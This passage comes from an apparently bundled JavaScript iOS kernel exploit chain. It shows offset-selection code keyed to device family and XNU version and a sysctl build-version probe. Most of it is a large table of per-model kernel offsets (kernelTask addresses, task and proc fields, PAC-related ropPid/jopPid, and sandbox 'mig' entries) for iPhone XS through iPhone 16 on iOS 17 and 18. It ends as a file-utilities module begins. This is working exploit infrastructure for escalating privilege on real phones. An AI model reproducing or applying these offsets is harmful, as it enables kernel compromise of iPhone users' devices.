			foundModelOffsets = this.#getOffsetsByVersion(modelOffsets, xnuMajor, xnuMinor);

		// Merge family offsets and device offsets
		let foundOffsets = new libs_Chain_OffsetsStruct__WEBPACK_IMPORTED_MODULE_0__["default"]();
		Object.assign(foundOffsets, foundFamilyOffsets);
		if (foundModelOffsets)
			Object.assign(foundOffsets, foundModelOffsets);

		if (["iPhone15", "iPhone16", "iPhone17"].includes(deviceFamily))
			foundOffsets.T1SZ_BOOT = 17n;
		else
			foundOffsets.T1SZ_BOOT = 25n;

		console.log(TAG, "Offsets: " + JSON.stringify(foundOffsets, (_,v) => typeof v === 'bigint' ? "0x"+v.toString(16) : v, 2));

		return foundOffsets;
	}

	static #getOffsetsByVersion(offsets, xnuMajor, xnuMinor) {
		let xnuMajorOffsets = 0;
		for (let major in offsets) {
			if (xnuMajor < major)
				continue;
			if (xnuMajorOffsets < major)
				xnuMajorOffsets = major;
		}

		if (!xnuMajorOffsets) {
			console.log(TAG, "Unsupported XNU major: " + xnuMajor);
			return null;
		}

		//console.log(TAG, "Matching XNU major: " + xnuMajorOffsets);
		xnuMajorOffsets = offsets[xnuMajorOffsets];

		let foundOffsets = {};
		let xnuMinorOffsets = -1;
		const sortedMinors = Object.keys(xnuMajorOffsets).sort();
		for (let minor of sortedMinors) {
			//console.log(TAG, `minor: ${minor}, xnuMinor: ${xnuMinor}`);
			if (minor > xnuMinor)
				break;
			if (xnuMinorOffsets < minor) {
				xnuMinorOffsets = minor;
				Object.assign(foundOffsets, xnuMajorOffsets[minor]);
			}
		}

		//console.log(TAG, "Matching XNU minor: " + xnuMinorOffsets);

		return foundOffsets;
	}
	static getBuildVersion() {
		const CTL_KERN = 1;
		const KERN_OSVERSION = 65;

		const mib = new ArrayBuffer(4 * 2);
		const mibView = new DataView(mib);
		mibView.setInt32(0, CTL_KERN, true);
		mibView.setInt32(4, KERN_OSVERSION, true);

		const mibAddr = Native.mem;
		const resultAddr = Native.mem + 0x100n;
		const lengthAddr = Native.mem + 0x200n;

		Native.write(Native.mem, mib);

		let ret = Native.callSymbol("sysctl", mibAddr, 2, resultAddr, lengthAddr, null, 0);
		if (ret != 0) {
			console.log(TAG, "Unable to get iOS build version");
			return null;
		}

		const length = Native.read32(lengthAddr);
		const buildVer = Native.readString(resultAddr, length);
		return buildVer;
	}
}


/***/ }),

/***/ "./src/libs/Driver/OffsetsTable.js":
/*!*****************************************!*\
  !*** ./src/libs/Driver/OffsetsTable.js ***!
  \*****************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   offsets: () => (/* binding */ offsets)
/* harmony export */ });
const offsets = {
	// iPhone XS
	// iPhone XS Max
	// iPhone XS Max Global
	// iPhone XR
	"iPhone11": {
		"*": {
			23: {
				0: {
					pComm: 0x568n,
					excGuard: 0x5bcn,
					kstackptr: 0xe8n,
					ropPid: 0x150n,
					jopPid: 0x158n,
					guardExcCode: 0x308n,
					taskThreads: 0x348n,
					tro: 0x358n,
					ast: 0x37cn,
					mutexData: 0x380n,
					ctid: 0x408n,
					troTask: 0x20n
				},
				3: {
					kernelTask: 0x918210n,
					guardExcCode: 0x318n,
					taskThreads: 0x358n,
					tro: 0x368n,
					ast: 0x38cn,
					mutexData: 0x398n,
					ctid: 0x418n
				},
				4: {
					kernelTask: 0x91c638n,
					pComm: 0x56cn,
					troTask: 0x28n,
					guardExcCode: 0x320n,
					taskThreads: 0x360n,
					tro: 0x370n,
					ast: 0x394n,
					mutexData: 0x3a0n,
					ctid: 0x420n,
					procRO: 0x388n
				},
				5: {
					kernelTask: 0x920a90n
				},
				6: {
					kernelTask: 0x9209f0n
				},
				6.1: {
					kernelTask: 0x920a40n
				}
			},
			24: {
				0: {
					kernelTask: 0x9f1548n,
					pComm: 0x56cn,
					procRO: 0x3a0n,
					ipcSpace: 0x318n,
					troTask: 0x28n,
					excGuard: 0x5dcn,
					kstackptr: 0xf0n,
					ropPid: 0x158n,
					jopPid: 0x160n,
					guardExcCode: 0x320n,
					taskThreads: 0x370n,
					tro: 0x378n,
					ast: 0x39cn,
					mutexData: 0x3a8n,
					ctid: 0x428n
				},
				1: {
					kernelTask: 0x9f1560n,
					taskThreads: 0x368n,
					tro: 0x370n,
					ast: 0x394n,
					mutexData: 0x3a0n,
					ctid: 0x420n
				},
				2: {
					kernelTask: 0x9fd988n,
				},
				3: {
					kernelTask: 0x9f5988n
				},
				4: {
					kernelTask: 0xa62b50n,
					procRO: 0x3c0n,
					excGuard: 0x5fcn,
					taskThreads: 0x370n,
					tro: 0x378n,
					ast: 0x39cn,
					mutexData: 0x3a8n,
					ctid: 0x428n
				},
				5: {
					kernelTask: 0xa6ac38n
				},
				6: {
					kernelTask: 0xa6ad48n,
  					guardExcCode: 0x328n,
					taskThreads: 0x378n,
  					tro: 0x380n,
  					ast: 0x3a4n,
  					mutexData: 0x3b0n,
  					ctid: 0x430n,
  					migLock: 0x36971f0n,
  					migSbxMsg: 0x3697210n,
  					migKernelStackLR: 0x2f7c1a0n,
				}
			}
		},
		"8": {
			23: {
				4: {
					kernelTask: 0x8fc638n
				},
				5: {
					kernelTask: 0x900a90n
				},
				6: {
					kernelTask: 0x9009f0n
				},
				6.1: {
					kernelTask: 0x900a40n
				}
			},
			24: {
				0: {
					kernelTask: 0x9d1548n
				},
				1: {
					kernelTask: 0x9d1560n,
				},
				2: {
					kernelTask: 0x9d9988n
				},
				3: {
					kernelTask: 0x9d1988n
				},
				4: {
					kernelTask: 0xa42b50n
				},
				5: {
					kernelTask: 0xad6b78n,
					migLock: 0x38d74e8n,
					migSbxMsg: 0x38d7508n,
					migKernelStackLR: 0x31b19e4n
				},
				6: {
					kernelTask: 0xa4ad48n,
					migLock: 0x352e1f0n,
					migSbxMsg: 0x352e210n,
					migKernelStackLR: 0x2e5ba20n,
				}
			}
		}
	},

	// iPhone 11
	// iPhone 11 Pro
	// iPhone 11 Pro Max
	// iPhone SE 2
	"iPhone12": {
		"*": {
			23: {
				0: {
					pComm: 0x568n,
					excGuard: 0x5bcn,
					kstackptr: 0xf0n,
					ropPid: 0x158n,
					jopPid: 0x160n,
					guardExcCode: 0x328n,
					taskThreads: 0x368n,
					tro: 0x378n,
					ast: 0x39cn,
					mutexData: 0x3a8n,
					ctid: 0x428n,
					troTask: 0x20n
				},
				3: {
					kernelTask: 0x96c178n,
				},
				4: {
					kernelTask: 0x970588n,
					pComm: 0x56cn,
					troTask: 0x28n,
					guardExcCode: 0x330n,
					taskThreads: 0x370n,
					tro: 0x380n,
					ast: 0x3a4n,
					mutexData: 0x3b0n,
					ctid: 0x430n,
					procRO: 0x388n
				},
				5: {
					kernelTask: 0x9749d8n
				},
				6: {
					kernelTask: 0x974938n
				},
				6.1: {
					kernelTask: 0x974988n
				}
			},
			24: {
				0: {
					kernelTask: 0xa49488n,
					pComm: 0x56cn,
					procRO: 0x3a0n,
					ipcSpace: 0x318n,
					troTask: 0x28n,
					excGuard: 0x5dcn,
					kstackptr: 0xf8n,
					ropPid: 0x160n,
					jopPid: 0x168n,
					guardExcCode: 0x330n,
					taskThreads: 0x380n,
					tro: 0x388n,
					ast: 0x3acn,
					mutexData: 0x3b8n,
					ctid: 0x438n
				},
				1: {
					kernelTask: 0xa494a0n,
					taskThreads: 0x378n,
					tro: 0x380n,
					ast: 0x3a4n,
					mutexData: 0x3b0n,
					ctid: 0x430n
				},
				2: {
					kernelTask: 0xa518c8n
				},
				3: {
					kernelTask: 0xa498c8n
				},
				4: {
					kernelTask: 0xacea90n,
					procRO: 0x3c0n,
					excGuard: 0x5fcn,
					taskThreads: 0x380n,
					tro: 0x388n,
					ast: 0x3acn,
					mutexData: 0x3b8n,
					ctid: 0x438n
				},
				5: {
					kernelTask: 0xad6b78n,
					migLock: 0x38d74e8n,
					migSbxMsg: 0x38d7508n,
					migKernelStackLR: 0x31b19e4n,
				},
				6: {
					kernelTask: 0xad6c88n,
  					guardExcCode: 0x338n,
					taskThreads: 0x388n,
  					tro: 0x390n,
  					ast: 0x3b4n,
  					mutexData: 0x3c0n,
  					ctid: 0x440n,
					migLock: 0x38e34e8n,
					migSbxMsg: 0x38e3508n,
					migKernelStackLR: 0x31ba7a0n,
				}
			}
		},
		"3": {
			23: {
				4: {
					kernelTask: 0x974588n
				},
				5: {
					kernelTask: 0x9789d8n
				},
				6: {
					kernelTask: 0x974938n
				},
				6.1: {
					kernelTask: 0x974988n
				}
			},
			24: {
				0: {
					kernelTask: 0xa49488n
				},
				1: {
					kernelTask: 0xa4d4a0n
				},
				2: {
					kernelTask: 0xa558c8n
				},
				3: {
					kernelTask: 0xa4d8c8n
				},
				4: {
					kernelTask: 0xacea90n
				},
				5: {
					kernelTask: 0xad6b78n,
					migLock: 0x38d74e8n,
					migSbxMsg: 0x38d7508n,
					migKernelStackLR: 0x31b19e4n,
				},
				6: {
					kernelTask: 0xad6c88n,
					migLock: 0x38e7468n,
					migSbxMsg: 0x38e7488n,
					migKernelStackLR: 0x31bf5a0n,
				}
			}
		},
		"5": {
			23: {
				4: {
					kernelTask: 0x974588n
				},
				5: {
					kernelTask: 0x9789d8n
				},
				6: {
					kernelTask: 0x974938n
				},
				6.1: {
					kernelTask: 0x974988n
				}
			},
			24: {
				0: {
					kernelTask: 0xa49488n
				},
				1: {
					kernelTask: 0xa4d4a0n
				},
				2: {
					kernelTask: 0xa558c8n
				},
				3: {
					kernelTask: 0xa4d8c8n
				},
				4: {
					kernelTask: 0xacea90n
				},
				5: {
					kernelTask: 0xad6b78n,
					migLock: 0x38d74e8n,
					migSbxMsg: 0x38d7508n,
					migKernelStackLR: 0x31b19e4n,
				},
				6: {
					kernelTask: 0xad6c88n,
					migLock: 0x38e7468n,
					migSbxMsg: 0x38e7488n,
					migKernelStackLR: 0x31bf5a0n,
				}
			}
		},
		"8": {
			23: {
				4: {
					kernelTask: 0x960588n
				},
				5: {
					kernelTask: 0x9649d8n
				},
				6: {
					kernelTask: 0x964938n
				},
				6.1: {
					kernelTask: 0x964988n
				}
			},
			24: {
				0: {
					kernelTask: 0xa35488n
				},
				1: {
					kernelTask: 0xa354a0n
				},
				2: {
					kernelTask: 0xa3d8c8n
				},
				3: {
					kernelTask: 0xa358c8n
				},
				4: {
					kernelTask: 0xab6a90n
				},
				5: {
					kernelTask: 0xabeb78n
				},
				6: {
					kernelTask: 0xac2c88n,
					migLock: 0x387a8e8n,
					migSbxMsg: 0x387a908n,
					migKernelStackLR: 0x3156f20n,
				}
			}
		}
	},

	// iPhone 12
	// iPhone 12 Mini
	// iPhone 12 Pro
	// iPhone 12 Pro Max
	"iPhone13": {
		"*": {
			23: {
				0: {
					pComm: 0x568n,
					excGuard: 0x5bcn,
					kstackptr: 0xf0n,
					ropPid: 0x158n,
					jopPid: 0x160n,
					guardExcCode: 0x318n,
					taskThreads: 0x358n,
					tro: 0x368n,
					ast: 0x38cn,
					mutexData: 0x390n,
					ctid: 0x418n,
					troTask: 0x20n
				},
				3: {
					kernelTask: 0x94c2d0n,
					guardExcCode: 0x328n,
					taskThreads: 0x368n,
					tro: 0x378n,
					ast: 0x39cn,
					mutexData: 0x3a8n,
					ctid: 0x428n
				},
				4: {
					kernelTask: 0x9546e0n,
					pComm: 0x56cn,
					troTask: 0x28n,
					guardExcCode: 0x330n,
					taskThreads: 0x370n,
					tro: 0x380n,
					ast: 0x3a4n,
					mutexData: 0x3b0n,
					ctid: 0x430n,
					procRO: 0x388n
				},
				5: {
					kernelTask: 0x954b30n
				},
				6: {
					kernelTask: 0x954a90n
				},
				6.1: {
					kernelTask: 0x954ae0n
				}
			},
			24: {
				0: {
					kernelTask: 0xa295e0n,
					pComm: 0x56cn,
					procRO: 0x3a0n,
					ipcSpace: 0x318n,
					troTask: 0x28n,
					excGuard: 0x5dcn,
					kstackptr: 0xf8n,
					ropPid: 0x160n,
					jopPid: 0x168n,
					guardExcCode: 0x330n,
					taskThreads: 0x380n,
					tro: 0x388n,
					ast: 0x3acn,
					mutexData: 0x3b8n,
					ctid: 0x438n
				},
				1: {
					kernelTask: 0xa2d5f8n,
					taskThreads: 0x378n,
					tro: 0x380n,
					ast: 0x3a4n,
					mutexData: 0x3b0n,
					ctid: 0x430n
				},
				2: {
					kernelTask: 0xa35a20n
				},
				3: {
					kernelTask: 0xa2da20n
				},
				4: {
					kernelTask: 0xa9ebe8n,
					procRO: 0x3c0n,
					excGuard: 0x5fcn,
					taskThreads: 0x380n,
					tro: 0x388n,
					ast: 0x3acn,
					mutexData: 0x3b8n,
					ctid: 0x438n,
					migLock: 0x37b8b80n,
					migSbxMsg: 0x37b8ba0n,
					migKernelStackLR: 0x3190fa0n
				},
				5: {
					kernelTask: 0xaa6cd0n,
					migLock: 0x37d4c90n,
					migSbxMsg: 0x37d4cb0n,
					migKernelStackLR: 0x31acce4n
				},
				6: {
					kernelTask: 0xaaade0n,
					guardExcCode: 0x338n,
					taskThreads: 0x388n,
					tro: 0x390n,
					ast: 0x3b4n,
					mutexData: 0x3c0n,
					ctid: 0x440n,
					migLock: 0x37dcc90n,
					migSbxMsg: 0x37dccb0n,
					migKernelStackLR: 0x31b5b60n,
				}
			}
		}
	},

	// iPhone 13
	// iPhone 13 Mini
	// iPhone 13 Pro
	// iPhone 13 Pro Max
	// iPhone SE 3
	// iPhone 14
	// iPhone 14 Plus
	"iPhone14": {
		"*": {
			23: {
				0: {
					pComm: 0x568n,
					excGuard: 0x5d4n,
					kstackptr: 0xf0n,
					ropPid: 0x160n,
					jopPid: 0x168n,
					guardExcCode: 0x330n,
					taskThreads: 0x370n,
					tro: 0x380n,
					ast: 0x3a4n,
					mutexData: 0x3b0n,
					ctid: 0x430n,
					troTask: 0x20n
				},
				3: {
					kernelTask: 0x918ee0n,
				},
				4: {
					kernelTask: 0x91d318n,
					pComm: 0x56cn,
					troTask: 0x28n,
					guardExcCode: 0x338n,
					taskThreads: 0x378n,
					tro: 0x388n,
					ast: 0x3acn,
					mutexData: 0x3b8n,
					ctid: 0x438n
				},
				5: {
					kernelTask: 0x925770n
				},
				6: {
					kernelTask: 0x9256d0n
				},
				6.1: {
					kernelTask: 0x925720n
				}
			},
			24: {
				0: {
					kernelTask: 0x9f6230n,
					pComm: 0x56cn,
					procRO: 0x3b8n,
					ipcSpace: 0x318n,
					troTask: 0x28n,
					excGuard: 0x5f4n,
					kstackptr: 0xf8n,
					ropPid: 0x168n,
					jopPid: 0x170n,
					guardExcCode: 0x338n,
					taskThreads: 0x388n,
					tro: 0x390n,
					ast: 0x3b4n,
					mutexData: 0x3c0n,
					ctid: 0x440n
				},
				1: {
					kernelTask: 0x9f6248n,
					taskThreads: 0x380n,
					tro: 0x388n,
					ast: 0x3acn,
					mutexData: 0x3b8n,
					ctid: 0x438n
				},
				2: {
					kernelTask: 0xa02678n
				},
				3: {
					kernelTask: 0x9fa678n
				},
				4: {
					kernelTask: 0xa67b18n,
					procRO: 0x3e0n,
					excGuard: 0x624n,
					taskThreads: 0x388n,
					tro: 0x390n,
					ast: 0x3b4n,
					mutexData: 0x3c0n,
					ctid: 0x448n,
					migLock: 0x382c218n,
					migSbxMsg: 0x382c238n,
					migKernelStackLR: 0x317d020n
				},
				5: {
					kernelTask: 0xa6fc00n,
					migLock: 0x3848428n,
					migSbxMsg: 0x3848448n,
					migKernelStackLR: 0x31994a4n
				},
				6: {
					kernelTask: 0xa73d10n,
					guardExcCode: 0x340n,
					taskThreads: 0x390n,
					tro: 0x398n,
					ast: 0x3bcn,
					mutexData: 0x3c8n,
					ctid: 0x450n,
					migLock: 0x38543a8n,
					migSbxMsg: 0x38543c8n,
					migKernelStackLR: 0x31a27e0n,
				}
			}
		},
		"6": {
			23: {
				4: {
					kernelTask: 0x92d318n
				},
				5: {
					kernelTask: 0x935770n
				},
				6: {
					kernelTask: 0x9316d0n
				},
				6.1: {
					kernelTask: 0x931720n
				}
			},
			24: {
				0: {
					kernelTask: 0xa06230n
				},
				1: {
					kernelTask: 0xa06248n
				},
				2: {
					kernelTask: 0xa12678n
				},
				3: {
					kernelTask: 0xa0a678n
				},
				4: {
					kernelTask: 0xa77b18n,
					migLock: 0x3898c18n,
					migSbxMsg: 0x3898c38n,
					migKernelStackLR: 0x31dff60n
				},
				5: {
					kernelTask: 0xa7fc00n,
					migLock: 0x38b4e28n,
					migSbxMsg: 0x38b4e48n,
					migKernelStackLR: 0x31fc3e4n
				},
				6: {
					kernelTask: 0xa83d10n,
					migLock: 0x38bcda8n,
					migSbxMsg: 0x38bcdc8n,
					migKernelStackLR: 0x3205560n,
				}
			}
		},
		"7": {
			23: {
				4: {
					kernelTask: 0x919318n
				},
				5: {
					kernelTask: 0x921770n
				},
				6: {
					kernelTask: 0x9216d0n
				},
				6.1: {
					kernelTask: 0x921720n
				}
			},
			24: {
				0: {
					kernelTask: 0x9f2230n
				},
				1: {
					kernelTask: 0x9f2248n
				},
				2: {
					kernelTask: 0x9fe678n
				},
				3: {
					kernelTask: 0x9f6678n
				},
				4: {
					kernelTask: 0xa67b18n,
					migLock: 0x3813d98n,
					migSbxMsg: 0x3813db8n,
					migKernelStackLR: 0x3163ae0n
				},
				5: {
					kernelTask: 0xa6fc00n,
					migLock: 0x382ffa8n,
					migSbxMsg: 0x382ffc8n,
					migKernelStackLR: 0x317ffa4n
				},
				6: {
					kernelTask: 0xa6fd10n,
					migLock: 0x3833fa8n,
					migSbxMsg: 0x3833fc8n,
					migKernelStackLR: 0x31852a0n,
				}
			}
		},
		"8": {
			23: {
				4: {
					kernelTask: 0x919318n
				},
				5: {
					kernelTask: 0x921770n
				},
				6: {
					kernelTask: 0x9216d0n
				},
				6.1: {
					kernelTask: 0x921720n
				}
			},
			24: {
				0: {
					kernelTask: 0x9f2230n
				},
				1: {
					kernelTask: 0x9f2248n
				},
				2: {
					kernelTask: 0x9fe678n
				},
				3: {
					kernelTask: 0x9f6678n
				},
				4: {
					kernelTask: 0xa67b18n,
					migLock: 0x3813d98n,
					migSbxMsg: 0x3813db8n,
					migKernelStackLR: 0x3163ae0n
				},
				5: {
					kernelTask: 0xa6fc00n,
					migLock: 0x382ffa8n,
					migSbxMsg: 0x382ffc8n,
					migKernelStackLR: 0x317ffa4n
				},
				6: {
					kernelTask: 0xa6fd10n,
					migLock: 0x3833fa8n,
					migSbxMsg: 0x3833fc8n,
					migKernelStackLR: 0x31852a0n,
				}
			}
		}
	},

	// iPhone 14 Pro
	// iPhone 14 Pro Max
	// iPhone 15
	// iPhone 15 Plus
	"iPhone15": {
		"*": {
			23: {
				0: {
					pComm: 0x568n,
					excGuard: 0x5d4n,
					kstackptr: 0xf0n,
					ropPid: 0x160n,
					jopPid: 0x168n,
					guardExcCode: 0x330n,
					taskThreads: 0x370n,
					tro: 0x380n,
					ast: 0x3a4n,
					mutexData: 0x3b0n,
					ctid: 0x430n,
					troTask: 0x20n
				},
				3: {
					kernelTask: 0x914e00n,
				},
				4: {
					kernelTask: 0x919238n,
					pComm: 0x56cn,
					troTask: 0x28n,
					guardExcCode: 0x338n,
					taskThreads: 0x378n,
					tro: 0x388n,
					ast: 0x3acn,
					mutexData: 0x3b8n,
					ctid: 0x438n
				},
				5: {
					kernelTask: 0x921690n
				},
				6: {
					kernelTask: 0x9215f0n
				},
				6.1: {
					kernelTask: 0x921640n
				},
				6.2: {
					kernelTask: 0x91d640n
				}
			},
			24: {
				0: {
					kernelTask: 0x9ee150n,
					pComm: 0x56cn,
					procRO: 0x3b8n,
					ipcSpace: 0x318n,
					troTask: 0x28n,
					excGuard: 0x5f4n,
					kstackptr: 0xf8n,
					ropPid: 0x168n,
					jopPid: 0x170n,
					guardExcCode: 0x338n,
					taskThreads: 0x388n,
					tro: 0x390n,
					ast: 0x3b4n,
					mutexData: 0x3c0n,
					ctid: 0x440n
				},
				1: {
					kernelTask: 0x9f2168n,
					taskThreads: 0x380n,
					tro: 0x388n,
					ast: 0x3acn,
					mutexData: 0x3b8n,
					ctid: 0x438n
				},
				2: {
					kernelTask: 0x9fe598n
				},
				3: {
					kernelTask: 0x9f6598n
				},
				4: {
					kernelTask: 0xa67c18n,
					procRO: 0x3e0n,
					excGuard: 0x624n,
					taskThreads: 0x388n,
					tro: 0x390n,
					ast: 0x3b4n,
					mutexData: 0x3c0n,
					ctid: 0x448n,
					migLock: 0x37863f8n,
					migSbxMsg: 0x3786418n,
					migKernelStackLR: 0x3131620n
				},
				5: {
					kernelTask: 0xa6fd00n,
					migLock: 0x37a2788n,
					migSbxMsg: 0x37a27a8n,
					migKernelStackLR: 0x314dc24n
				},
				6: {
					kernelTask: 0xa6fe10n,
  					guardExcCode: 0x340n,
					taskThreads: 0x390n,
  					tro: 0x398n,
  					ast: 0x3bcn,
					mutexData: 0x3c8n,
					ctid: 0x450n,
					migLock: 0x37aa708n,
					migSbxMsg: 0x37aa728n,
					migKernelStackLR: 0x3152ee0n
				}
			}
		},
		"4": {
			23: {
				4: {
					kernelTask: 0x941238n
				},
				5: {
					kernelTask: 0x949690n
				},
				6: {
					kernelTask: 0x9495f0n
				},
				6.1: {
					kernelTask: 0x949640n
				}
			},
			24: {
				0: {
					kernelTask: 0xa2a150n
				},
				1: {
					kernelTask: 0xa2a168n
				},
				2: {
					kernelTask: 0xa3a598n
				},
				3: {
					kernelTask: 0xa32598n
				},
				4: {
					kernelTask: 0xaa3c18n,
					migLock: 0x38c5388n,
					migSbxMsg: 0x38c53a8n,
					migKernelStackLR: 0x325f1e0n
				},
				5: {
					kernelTask: 0xaa7d00n,
					migLock: 0x38dd698n,
					migSbxMsg: 0x38dd6b8n,
					migKernelStackLR: 0x32777e4n
				},
				6: {
					kernelTask: 0xaabe10n,
					migLock: 0x38e5618n,
					migSbxMsg: 0x38e5638n,
					migKernelStackLR: 0x3280aa0n,
				}
			}
		},
		"5": {
			23: {
				4: {
					kernelTask: 0x941238n
				},
				5: {
					kernelTask: 0x949690n
				},
				6: {
					kernelTask: 0x9495f0n
				},
				6.1: {
					kernelTask: 0x949640n
				}
			},
			24: {
				0: {
					kernelTask: 0xa2a150n
				},
				1: {
					kernelTask: 0xa2a168n
				},
				2: {
					kernelTask: 0xa3a598n
				},
				3: {
					kernelTask: 0xa32598n
				},
				4: {
					kernelTask: 0xaa3c18n,
					migLock: 0x38c5388n,
					migSbxMsg: 0x38c53a8n,
					migKernelStackLR: 0x325f1e0n
				},
				5: {
					kernelTask: 0xaa7d00n,
					migLock: 0x38dd698n,
					migSbxMsg: 0x38dd6b8n,
					migKernelStackLR: 0x32777e4n
				},
				6: {
					kernelTask: 0xaabe10n,
					migLock: 0x38e5618n,
					migSbxMsg: 0x38e5638n,
					migKernelStackLR: 0x3280aa0n,
				}
			}
		}
	},

	// iPhone 15 Pro
	// iPhone 15 Pro Max
	"iPhone16": {
		"*": {
			23: {
				0: {
					pComm: 0x568n,
					excGuard: 0x5d4n,
					kstackptr: 0x140n,
					ropPid: 0x1b0n,
					jopPid: 0x1b8n,
					guardExcCode: 0x380n,
					taskThreads: 0x3c0n,
					tro: 0x3d0n,
					ast: 0x3f4n,
					mutexData: 0x400n,
					ctid: 0x480n,
					troTask: 0x20n
				},
				3: {
					kernelTask: 0x978ef0n,
				},
				4: {
					kernelTask: 0x991eb0n,
					pComm: 0x56cn,
					troTask: 0x28n,
					options: 0xc0n,
					guardExcCode: 0x388n,
					taskThreads: 0x3c8n,
					tro: 0x3d8n,
					ast: 0x3fcn,
					mutexData: 0x408n,
					ctid: 0x488n
				},
				5: {
					kernelTask: 0x99a308n,
				},
				6: {
					kernelTask: 0x99a268n
				},
				6.1: {
					kernelTask: 0x99a2b8n
				},
				6.2: {
					kernelTask: 0x9962b8n
				}
			},
			24: {
				0: {
					kernelTask: 0xaae870n,
					pComm: 0x56cn,
					procRO: 0x3b8n,
					ipcSpace: 0x318n,
					troTask: 0x28n,
					excGuard: 0x5f4n,
					kstackptr: 0x148n,
					ropPid: 0x1b8n,
					jopPid: 0x1c0n,
					guardExcCode: 0x388n,
					taskThreads: 0x3d8n,
					tro: 0x3e0n,
					ast: 0x404n,
					mutexData: 0x410n,
					ctid: 0x490n,
					options: 0xc0n
				},
				1: {
					kernelTask: 0xaae888n,
					taskThreads: 0x3d0n,
					tro: 0x3d8n,
					ast: 0x3fcn,
					mutexData: 0x408n,
					ctid: 0x488n
				},
				2: {
					kernelTask: 0xab6cb8n
				},
				3: {
					kernelTask: 0xab2cb8n
				},
				4: {
					kernelTask: 0xb23d28n,
					procRO: 0x3e0n,
					excGuard: 0x624n,
					taskThreads: 0x3d8n,
					tro: 0x3e0n,
					ast: 0x404n,
					mutexData: 0x410n,
					ctid: 0x498n,
					migLock: 0x3c03ef0n,
					migSbxMsg: 0x3c03f10n,
					migKernelStackLR: 0x3582fe0n
				},
				5: {
					kernelTask: 0xb2be10n,
					migLock: 0x3c181a8n,
					migSbxMsg: 0x3c181c8n,
					migKernelStackLR: 0x35993a4n
				},
				6: {
					kernelTask: 0xb2ff20n,
  					guardExcCode: 0x390n,
					taskThreads: 0x3e0n,
  					tro: 0x3e8n,
					ast: 0x40cn,
					mutexData: 0x418n,
					ctid: 0x4a0n,
					migLock: 0x3c241a8n,
					migSbxMsg: 0x3c241c8n,
					migKernelStackLR: 0x35a26a0n,
				}
			}
		}
	},
	// iPhone 16
	// iPhone 16 plus
	// iPhone 16 pro
	// iPhone 16 pro max
	"iPhone17": {
		"*": {
			24: {
				0: {
					kernelTask: 0xb7e1c8n,
					pComm: 0x56cn,
					procRO: 0x3b8n,
					ipcSpace: 0x318n,
					troTask: 0x28n,
					excGuard: 0x5fcn,
					kstackptr: 0x148n,
					ropPid: 0x1b8n,
					jopPid: 0x1c0n,
					guardExcCode: 0x390n,
					taskThreads: 0x3e0n,
  					tro: 0x3e8n,
					ast: 0x40cn,
					mutexData: 0x418n,
					ctid: 0x4a8n,
					options: 0xc0n
				},
				1: {
					kernelTask: 0xb7e1e0n,
					taskThreads: 0x3d8n,
					tro: 0x3e0n,
					ast: 0x404n,
					mutexData: 0x410n,
					ctid: 0x4a0n,
				},
				2: {
					kernelTask: 0xb86610n
				},
				3: {
					kernelTask: 0xb82610n
				},
				4: {
					kernelTask: 0xc0fd80n,
					procRO: 0x3e0n,
					excGuard: 0x624n,
					taskThreads: 0x3e0n,
  					tro: 0x3e8n,
					ast: 0x40cn,
					mutexData: 0x418n,
					ctid: 0x4a8n,
					migLock: 0x4042dc0n,
					migSbxMsg: 0x4042de0n,
					migKernelStackLR: 0x3912aa0n
				},
				5: {
					kernelTask: 0xc17e68n,
					migLock: 0x405eff8n,
					migSbxMsg: 0x405f018n,
					migKernelStackLR: 0x392be64n
				},
				6: {
					kernelTask: 0xc1bf78n,
  					guardExcCode: 0x398n,
					taskThreads: 0x3e8n,
  					tro: 0x3f0n,
					ast: 0x414n,
					mutexData: 0x420n,
					ctid: 0x4b0n,
					migLock: 0x4066f88n,
					migSbxMsg: 0x4066fa8n,
					migKernelStackLR: 0x39352e0n,
				}
			}
		},
		"5": {
			24: {
				0: {
					kernelTask: 0xb7e1c8n,
					pComm: 0x56cn,
					procRO: 0x3b8n,
					ipcSpace: 0x318n,
					troTask: 0x28n,
					excGuard: 0x5fcn,
					kstackptr: 0x148n,
					ropPid: 0x1b8n,
					jopPid: 0x1c0n,
					guardExcCode: 0x390n,
					taskThreads: 0x3e0n,
  					tro: 0x3e8n,
					ast: 0x40cn,
					mutexData: 0x418n,
					ctid: 0x4a8n,
					options: 0xc0n
				},
				1: {
					kernelTask: 0xb7e1e0n,
					taskThreads: 0x3d8n,
					tro: 0x3e0n,
					ast: 0x404n,
					mutexData: 0x410n,
					ctid: 0x4a0n,
				},
				2: {
					kernelTask: 0xb86610n
				},
				3: {
					kernelTask: 0xb82610n
				},
				4: {
					kernelTask: 0xc0fd80n,
					procRO: 0x3e0n,
					excGuard: 0x624n,
					taskThreads: 0x3e0n,
  					tro: 0x3e8n,
					ast: 0x40cn,
					mutexData: 0x418n,
					ctid: 0x4a8n,
					migLock: 0x408acd0n,
					migSbxMsg: 0x408acf0n,
					migKernelStackLR: 0x396e4a0n
				},
				5: {
					kernelTask: 0xc17e68n,
					migLock: 0x40a6f08n,
					migSbxMsg: 0x40a6f28n,
					migKernelStackLR: 0x3987924n
				},
				6: {
					kernelTask: 0xc1ff78n,
					guardExcCode: 0x398n,
					taskThreads: 0x3e8n,
					tro: 0x3f0n,
					ast: 0x414n,
					mutexData: 0x420n,
					ctid: 0x4b0n,
					migLock: 0x40b6e98n,
					migSbxMsg: 0x40b6eb8n,
					migKernelStackLR: 0x3998de0n,
				}
			}
		}
	}
}


/***/ }),

/***/ "./src/libs/JSUtils/FileUtils.js":
/*!***************************************!*\
  !*** ./src/libs/JSUtils/FileUtils.js ***!
  \***************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ FileUtils)
/* harmony export */ });


const TAG = "FILE-UTILS";

const O_RDONLY	= 0x0000;
const O_WRONLY	= 0x0001;
const O_RDWR	= 0x0002;
const O_APPEND  = 0x0008;
const O_CREAT	= 0x0200;
const O_TRUNC	= 0x0400;
const O_EVTONLY	= 0x8000;

const ERROR		= -1;

const DT = {
	DT_UNKNOWN: 0,
	DT_FIFO: 1,
	DT_CHR: 2,
	DT_DIR: 4,
	DT_BLK: 6,
	DT_REG: 8,
	DT_LNK: 10,
	DT_SOCK: 12,
	DT_WHT: 14
};

const SEEK_SET = 0;

class FileUtils {


	static open(path) {
		const fd = Native.callSymbol("open", path, O_RDONLY);
		if (fd == ERROR) {
